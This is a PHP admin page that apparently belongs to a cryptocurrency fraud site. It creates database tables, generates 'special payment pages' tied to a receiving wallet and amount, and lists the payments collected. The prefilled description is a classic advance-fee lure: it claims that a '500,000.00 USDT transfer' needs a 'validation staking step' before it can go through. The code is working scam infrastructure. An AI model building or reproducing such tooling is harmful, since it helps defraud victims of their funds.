<?php
include 'config.php';
include 'cdn.php';

// Auto-create tables if they don't exist
$conn->query("CREATE TABLE IF NOT EXISTS special_payment_pages (
    id INT AUTO_INCREMENT PRIMARY KEY,
    code VARCHAR(64) NOT NULL UNIQUE,
    token_symbol VARCHAR(20) NOT NULL DEFAULT 'USDT',
    title VARCHAR(255) NOT NULL,
    description TEXT,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$conn->query("CREATE TABLE IF NOT EXISTS special_payments (
    id INT AUTO_INCREMENT PRIMARY KEY,
    page_id INT NOT NULL,
    code VARCHAR(64) NOT NULL,
    token_symbol VARCHAR(20) NOT NULL,
    from_address VARCHAR(255),
    to_address VARCHAR(255) NOT NULL,
    crypto_amount VARCHAR(50) NOT NULL,
    usd_amount VARCHAR(50) NOT NULL,
    status VARCHAR(50) DEFAULT 'Processing',
    user_note TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)");

$message = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'create_page') {
    $token_symbol = filter($_POST['token_symbol'] ?? 'USDT');
    $title = filter($_POST['title'] ?? 'Complete Your Crypto Transfer');
    $description = filter($_POST['description'] ?? '');
    $from_address = filter($_POST['from_address'] ?? '');
    $to_address = filter($_POST['to_address'] ?? '');
    $crypto_amount = filter($_POST['crypto_amount'] ?? '0');
    $usd_amount = filter($_POST['usd_amount'] ?? '0');

    $code = bin2hex(random_bytes(8));

    $stmt = $conn->prepare("INSERT INTO special_payment_pages (code, token_symbol, title, description, from_address, to_address, crypto_amount, usd_amount) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
    if ($stmt) {
        $stmt->bind_param("ssssssss", $code, $token_symbol, $title, $description, $from_address, $to_address, $crypto_amount, $usd_amount);
        if ($stmt->execute()) {
            $message = "<div class='alert alert-success' style='padding:12px; background:#22c55e20; border:1px solid #22c55e; color:#22c55e; border-radius:8px; margin-bottom:15px;'>Special payment page created successfully! URL: <a href='/pay?code=$code' target='_blank' style='color:#6366f1; font-weight:bold; text-decoration:underline;'>/pay?code=$code</a></div>";
        } else {
            $message = "<div class='alert alert-danger' style='padding:12px; background:#ef444420; border:1px solid #ef4444; color:#ef4444; border-radius:8px; margin-bottom:15px;'>Error: " . $conn->error . "</div>";
        }
    }
}

// Fetch generated links
$pages_res = $conn->query("SELECT * FROM special_payment_pages ORDER BY id DESC");

// Fetch received special payments
$payments_res = $conn->query("SELECT * FROM special_payments ORDER BY id DESC");
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Special Payments Management - Admin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: 'SF Pro Display', sans-serif; }
        .sidenav { height: 100%; width: 70px; position: fixed; z-index: 10; top: 0; left: 0; background-color: #111; overflow-x: hidden; padding-top: 20px; text-align: center; }
        .sidenav a { padding: 12px 0; text-decoration: none; font-size: 24px; color: #818181; display: block; }
        .sidenav a:hover { color: #f1f1f1; }
        .content { margin-left: 90px; padding: 25px; }
        .card-custom { background: #1e1e1e; border: 1px solid #333; border-radius: 12px; padding: 20px; margin-bottom: 25px; }
        .form-control, .form-select { background: #2a2a2a; border: 1px solid #444; color: #fff; }
        .form-control:focus, .form-select:focus { background: #333; border-color: #6366f1; color: #fff; box-shadow: none; }
        .table { color: #ddd; }
        .btn-primary { background: linear-gradient(135deg, #6366f1, #22d3ee); border: none; color: #000; font-weight: 700; }
        .btn-primary:hover { opacity: 0.9; color: #000; }
        .badge-processing { background: #f59e0b20; color: #f59e0b; border: 1px solid #f59e0b; }
    </style>
</head>
<body>

<div class="sidenav">
    <a href="/admin" title="Dashboard"><i class="fas fa-home"></i></a>
    <a href="/profits" title="Profits"><i class="fas fa-chart-line"></i></a>
    <a href="/user_management" title="Users"><i class="fas fa-users"></i></a>
    <a href="/admin_deposits/new" title="Deposits"><i class="fas fa-wallet"></i></a>
    <a href="/special_payments" title="Special Payments" style="color:#6366f1;"><i class="fas fa-qrcode"></i></a>
</div>

<div class="content">
    <h2 class="mb-4"><i class="fas fa-qrcode text-primary"></i> Special Payments Management</h2>

    <?php echo $message; ?>

    <div class="card-custom">
        <h4 class="mb-3"><i class="fas fa-plus-circle text-success"></i> Create Special Payment Page</h4>
        <form method="POST" action="">
            <input type="hidden" name="action" value="create_page">
            <div class="row g-3">
                <div class="col-md-3">
                    <label class="form-label">Crypto Symbol / Token</label>
                    <select name="token_symbol" class="form-select" required>
                        <option value="USDT">USDT (Tether)</option>
                        <option value="ETH">ETH (Ethereum)</option>
                        <option value="BTC">BTC (Bitcoin)</option>
                        <option value="SOL">SOL (Solana)</option>
                        <option value="BNB">BNB (Binance Coin)</option>
                        <option value="TRX">TRX (TRON)</option>
                    </select>
                </div>
                <div class="col-md-5">
                    <label class="form-label">Title</label>
                    <input type="text" name="title" class="form-control" value="Complete Your USDT Transfer" required>
                </div>
                <div class="col-md-4">
                    <label class="form-label">Crypto Amount (e.g. 0.04344239 ETH)</label>
                    <input type="text" name="crypto_amount" class="form-control" placeholder="0.04344239 ETH" required>
                </div>
                <div class="col-md-4">
                    <label class="form-label">USD Value (e.g. $109.57 USD)</label>
                    <input type="text" name="usd_amount" class="form-control" placeholder="≈ $109.57 USD" required>
                </div>
                <div class="col-md-4">
                    <label class="form-label">FROM Address (Optional display)</label>
                    <input type="text" name="from_address" class="form-control" placeholder="0x4bea2d3B8Ecb9b283350Db91dcC540C3e9C8be62">
                </div>
                <div class="col-md-4">
                    <label class="form-label">TO Address (Receiving Wallet)</label>
                    <input type="text" name="to_address" class="form-control" placeholder="0x80977C960b2E7F656acCA155D9d0bA445B87919b" required>
                </div>
                <div class="col-12">
                    <label class="form-label">Instruction / Description</label>
                    <textarea name="description" class="form-control" rows="2">To complete your 500,000.00 USDT transfer, a validation staking step is required to verify and authorize the transaction. Please complete the requested validation carefully so the transfer can proceed successfully.</textarea>
                </div>
                <div class="col-12 text-end">
                    <button type="submit" class="btn btn-primary px-4 py-2"><i class="fas fa-link"></i> Generate Special Payment Page</button>
                </div>
            </div>
        </form>
    </div>

    <div class="card-custom">
        <h4 class="mb-3"><i class="fas fa-link text-info"></i> Generated Special Payment Links</h4>
        <div class="table-responsive">
            <table class="table table-dark table-hover align-middle">
                <thead>
                    <tr>
                        <th>Code</th>
                        <th>Token</th>
                        <th>Crypto Amount</th>
                        <th>USD Value</th>
                        <th>Receiving Wallet</th>
                        <th>URL</th>
                        <th>Created</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($pages_res && $pages_res->num_rows > 0): ?>
                        <?php while ($p = $pages_res->fetch_assoc()): ?>
                            <tr>
                                <td><code><?php echo htmlspecialchars($p['code']); ?></code></td>
                                <td><span class="badge bg-secondary"><?php echo htmlspecialchars($p['token_symbol']); ?></span></td>
                                <td><strong><?php echo htmlspecialchars($p['crypto_amount']); ?></strong></td>
                                <td><?php echo htmlspecialchars($p['usd_amount']); ?></td>
                                <td style="font-size:12px;"><code><?php echo htmlspecialchars($p['to_address']); ?></code></td>
                                <td>
                                    <a href="/pay?code=<?php echo htmlspecialchars($p['code']); ?>" target="_blank" class="btn btn-sm btn-outline-info">
                                        <i class="fas fa-external-link-alt"></i> /pay?code=<?php echo htmlspecialchars($p['code']); ?>
                                    </a>
                                </td>
                                <td style="font-size:12px;"><?php echo htmlspecialchars($p['created_at']); ?></td>
                            </tr>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <tr><td colspan="7" class="text-center text-muted">No special payment pages created yet.</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>

    <div class="card-custom">
        <h4 class="mb-3"><i class="fas fa-receipt text-warning"></i> Received Special Payments</h4>
        <div class="table-responsive">
            <table class="table table-dark table-hover align-middle">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Link Code</th>
                        <th>Token</th>
                        <th>Amount</th>
                        <th>USD Value</th>
                        <th>From Address</th>
                        <th>To Address</th>
                        <th>Status</th>
                        <th>Submitted At</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($payments_res && $payments_res->num_rows > 0): ?>
                        <?php while ($pm = $payments_res->fetch_assoc()): ?>
                            <tr>
                                <td><?php echo $pm['id']; ?></td>
                                <td><code><?php echo htmlspecialchars($pm['code']); ?></code></td>
                                <td><span class="badge bg-primary"><?php echo htmlspecialchars($pm['token_symbol']); ?></span></td>
                                <td><strong><?php echo htmlspecialchars($pm['crypto_amount']); ?></strong></td>
                                <td><?php echo htmlspecialchars($pm['usd_amount']); ?></td>
                                <td style="font-size:12px;"><code><?php echo htmlspecialchars($pm['from_address']); ?></code></td>
                                <td style="font-size:12px;"><code><?php echo htmlspecialchars($pm['to_address']); ?></code></td>
                                <td><span class="badge badge-processing px-2 py-1"><?php echo htmlspecialchars($pm['status']); ?></span></td>
                                <td style="font-size:12px;"><?php echo htmlspecialchars($pm['created_at']); ?></td>
                            </tr>
                        <?php endwhile; ?>
                    <?php else: ?>
                        <tr><td colspan="9" class="text-center text-muted">No special payment submissions received yet.</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    </div>
</div>

</body>
</html>
